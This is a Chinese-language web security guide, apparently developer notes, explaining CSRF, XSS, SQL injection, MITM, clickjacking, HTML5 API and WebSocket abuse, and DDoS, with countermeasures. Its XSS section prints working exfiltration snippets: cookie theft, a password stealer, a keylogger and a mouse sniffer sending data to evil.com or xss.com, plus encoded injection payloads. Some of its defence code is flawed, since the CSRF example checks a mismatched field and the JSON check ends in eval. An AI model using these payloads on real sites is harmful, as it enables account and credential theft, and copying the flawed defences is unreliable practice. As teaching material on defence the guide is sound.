Web 安全指南
===
### Web安全
- 机密性，比如用户的隐私被窃取，帐号被盗，常见的方式是木马。
- 完整性，比如数据的完整，常见的方式是`XSS跨站脚本攻击`和`csrf跨站请求伪造`。
- 可用性，比如我们的网络服务是否可用，常用的攻击方式是`dos`和`ddos`，拒绝服务和分布式拒绝服务攻击。

### CSRF
`CSRF（Cross-site request forgery）`，中文名称：`跨站请求伪造`

**攻击者盗用了你的身份，以你的名义发送恶意请求。**
**想要CSRF获取用户的信息，一般需要XSS注入成功**

#### 攻击原理
CSRF攻击是源于 **WEB的隐式身份验证机制**！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！

**要完成一次CSRF攻击，受害者必须依次完成两个步骤：**
- 登录受信任网站A，并在本地生成Cookie。
- 在不登出A的情况下，访问危险网站B。

**CSRF攻击有效经常因为如下原因**
- 你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。
- 你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了......）
- 上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。

#### CSRF防御
不使用`GET`更新资源
服务端对客户端请求方法进行验证

##### 在客户端页面增加伪随机数(可以杜绝99%CSRF攻击, 除非用户Cookie被XSS漏洞盗取)
```php
<?php
  // 服务端
  // 构造加密的Cookie信息
  $value = “DefenseSCRF”;
  setcookie(”cookie”, $value, time()+3600);
?>

<?php
  // 客户端
  $hash = md5($_COOKIE['cookie']);
　　?>
  <form method=”POST” action=”transfer.php”>
    <input type=”text” name=”toBankId”>
    <input type=”text” name=”money”>
    <input type=”hidden” name=”hash” value=”<?=$hash;?>”>
    <input type=”submit” name=”submit” value=”Submit”>
  </form>

<?php
// 在服务器端进行Hash值验证
  if(isset($_POST['check'])) {
    $hash = md5($_COOKIE['cookie']);
    if($_POST['check'] == $hash) {
      doJob();
    } else {
      //...
    }
  } else {
    //...
  }
?>
```

##### 增加验证码
##### One-Time Tokens(不同的表单包含一个不同的伪随机值通常与用户身份有关不好猜测, 注意并行性兼容)

### XSS
`Cross-site scripting`, 中文名称: `跨站脚本分析`
#### 注入方式
##### javascript 注入
###### 常用js代码注入
```javascript
src="javascript:alert(‘xss’)；"
```
**js注入成功, 利用`location.href`注入拿到cookies或密码**
对于浏览器可以设置`httpOnly`来降低从用户端拿到`cookies`进行攻击的可能性
```javascript
location.href='http://www.xss.com?cookie=’+document.cookie'；
```
**js注入成功,从文本字段中窃取密码**
```javascript
function stealpw(){  
  var pw = document.getElementById("password").value;  
  document.images[0].src="http://evil.com/imgs/stealpw?pw=" + pw;  
}  
document.getElementById("button").onclick = stealpw; 
```

**js注入成功, 键盘记录工具（key logger）窃取键盘事件**
```javascript
function keylogger(e){  
  document.images[0].src = "http://evil.com/logger?key="  
  + e.keyCode;  
};  
document.body.addEventListener("keyup", keylogger, false);
```

**使用鼠标嗅探器窃取键盘事件**
```javascript
function sniffer(e){  
  document.images[0].src= "http://evil.com/imgs/sniffer?x="  
  + e.clientX + "&y=" + e.clientY;  
};  
document.body.addEventListener("mouseup", sniffer, false);  
```

**js注入成功, 插入错误信息**
```javascript
// 警告消息
...  
<style type="text/css"> #warning { color: red } </style>  
...  
<div id="warning">The links in this page may refer to   
potentially malicious Web pages, so be careful. </div>  
...  
// 消除警告
var e = document.getElementById("warning");  
e.style.color= "white";  
```

**js注入成功, `img.href`隐藏并注入**
```javascript
var img = document.createElement('img');
img.src='http://www.xss.com?cookie='+document.cookie;
img.style.display='none';
document.getElementsByTagName('body')[0].appendChild(img);
```

###### 上传文件注入
- js注入文件名
- js注入`exif`信息

###### 链接注入
**普通链接注入**
```javascript
http://www.baidu.com/“onclick=alert('xss') title="xss"
```
**`"` `'` 被转意但是依然注入**
```javascript
http://www.baidu.com/#"onclick=alert(this.name) name=xss ref=xss
```

##### Ajax JSON注入
###### 采用普通注入
```javascript
$('div:first').html('<script>alert("xss")</script>');
```
###### 采用`Unicode码`注入
```javascript
$('div:first').html('\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e');
```

#### 防范XSS注入
- 添加一个输入值检查
  - 黑名单： 在这种方法中，黑名单中的所有字符都会从输入中过滤掉。黑名单所面临的最大的挑战就是要确保所有危险的字符都包含在名单中。因为要预测到所有可能的输入组合是不可能的，所以黑名单经常不能实现正确的验证。
  - 白名单： 这种替代方法列出所有允许的字符并从输入中移除所有其它的字符。白名单所面临的最大的挑战就是在保持列表尽可能简短的同时，仍然能够提供足够的灵活性，允许 Web 应用程序所需的输入类型。
人们通常认为白名单是更加安全的选择。因此，推荐您使用白名单来清除具有潜在危险性的输入。
 
**对发送给浏览器并在其上显示的字符串中的特殊字符（比如说把小于号 (<) 换成 "&lt;"）进行转义是增强安全性的另一种方法。**
- 使用漏洞检查工具 
- 不要动态地生成和执行代码, 禁止使用`eval()` 
- 在集成不可信内容时使用 `<iframe>`, 利用同源策略使攻击者不容易访问整个`DOM`树
- 保障 JSON 的使用安全(使用正则表达式进行检查 或者 使用 JSON 解析器对 JSON 进行解析。)

```javascript
// 使用正则表达式检查 JSON 字符
var my_JSON_object = !(/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/.test(  
  text.replace(/"(\\.|[^"\\])*"/g, ' '))) &&  
  eval('(' + text + ')');  
```
 

### SQL注入
不要使用拼接字符串的方式进行`CRUD`, 进行数据库参数化查询, 页面参数传值只允许`a-z0-9`,对传入参数进行校验, 本地数据库不要存储重要数据

### 彩虹表攻击
不要存储密码原文, 密码加盐(盐为伪随机字符串), 二次hash 可以基本上杜绝彩虹表攻击

### 中间人攻击
无证书认证的互联网访问, 由于是无加密透明的, 所以经过的路由都可以查看路由流经数据, 无法防范中间人攻击。

#### TLS中间人攻击(TLS mim)
有什么危害？你与服务器的通信被第三方解密、查看、修改。

#### 如何防范
- 启用 `HTTPS` 浏览网页
- 必须对认证过程的传输者/认证过程的本身真实性进行认证。
- 用户根证书靠谱, 根证书必须是合格的证书颁发机构颁发(证书有危险时浏览器会警告用户)

### 劫持攻击
#### 点击劫持
被攻击的页面作为`iframe`，用`Mask`的方式设置为透明放在上层，恶意代码偷偷地放在后面的页面中，使得一个页面看起来似乎是安全的，然后诱骗用户点击网页上的内容，达到窃取用户信息或者劫持用户操作的目的。

#### 拖放的欺骗劫持
在同源策略里，一个域的`Cookie`只能被本域所访问，但是拖放操作是不受同源策略限制的，这样利用拖放操作、`XSS`和其他技巧，可以构造跨域合法请求，劫持`Cookie`。欺骗用户进行拖放行为，就可以把用户某个域的信息发送到另外一个域里。

#### 如何防范
- 方法1: `X-Frame-Options`
- 方法2: `if (top !==window)  top.location = window.location.href;` (攻击者可以使用204转向或者禁用Javascript的方式来绕过（例如iframe沙箱）。)

### HTML5 API攻击
#### registerProtocolHandler：信息泄漏

`HTML5`允许某些协议和`schema`注册为新的特性。
例如下面的语句可以注册一个`email handler`。
`navigator.registerProtocolHandler(“mailto”,“http://www.f.com/?uri=%s", “Evil Mail"); ` 
它会将一个恶意网站处理器关联到`mailto`这个协议上，所以它在某些情况下的滥用会导致用户信息泄漏。

#### 文件API：窃取文件

`HTML5`另外一些API从安全角度来看很有意思，它们还能混合起来使用。

例如文件API允许浏览器访问本地文件，攻击者可以将它与点击劫持和其他攻击混合起来获得用户本地的文件。比如骗取你从本地拖放文件到页面里，这种方法在劫持攻击一文中有较详细的阐述。

#### 历史API：隐藏XSS URL

利用`HTML5`历史API的`pushState`，可以隐藏浏览器地址栏的攻击`URL`。例如我在浏览器地址栏输入
`http://test.baidu.com/?text=</div><script>history.pushState({},'',location.href.split("?").shift());document.write(1)</script>`这个地址，用户将会仅仅只看到`http://test.baidu.com/`。

这个问题和现在流行的短网址技术结合起来，具有更大的隐蔽性。想象一下我们在微博上看到一个短网址，不会有任何怀疑就会点击这个地址查看内容，而最后看到的地址也是相当正常的，但是在这个过程中用户的信息和资料就不知不觉被盗取了。
![短URL结合历史API的攻击](http://images.51cto.com/files/uploadimg/20130104/1352070.jpg)

#### Web Notifications：盗取数据
`Web Notifications`让我们在浏览器中能够接收推送的消息通知，但是它有可能会被攻击者利用来构造虚假信息，骗取用户数据。
![桌面通知攻击](http://images.51cto.com/files/uploadimg/20130104/1352071.jpg)

### Web Socket 攻击
攻击者有可能利用`webSocket`连接, 执行服务器端口扫描程序, 如果发现漏洞, 看可以建立隧道, 这样浏览器就编程一个后门通道

`Web Socket`会带来的威胁包括：
- 成为后门
- 端口扫描
- 僵尸网络(一到多的连接)
- 构造基于`WebSocket`的嗅探器

#### 防范手段
严格限制`WebSocket`的权限, 并注意内网端口

### DDOS攻击
DDOS攻击网站常见弱点(写数据库，联表查询，缓存溢出)
- 登录认证
- 评论
- 用户动态
- ajax api
- ...

#### 防范手段
- 拼带宽 壕行为
- 流量清洗&封IP 这么做的前提是攻击包至少要到你的机房。而机房自保的措施导致了数据包根本到不了机房，无解
- CDN服务 保住静态化主页可以访问

### 参考
- [关于XSS（跨站脚本攻击）和CSRF（跨站请求伪造）](https://cnodejs.org/topic/50463565329c5139760c34a1)
- [浅谈CSRF攻击方式](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
- [征服 Ajax 应用程序的安全威胁](http://justcoding.iteye.com/blog/1366109)
- [HTML5安全风险详析之六：API攻击](http://netsecurity.51cto.com/art/201301/375586.htm)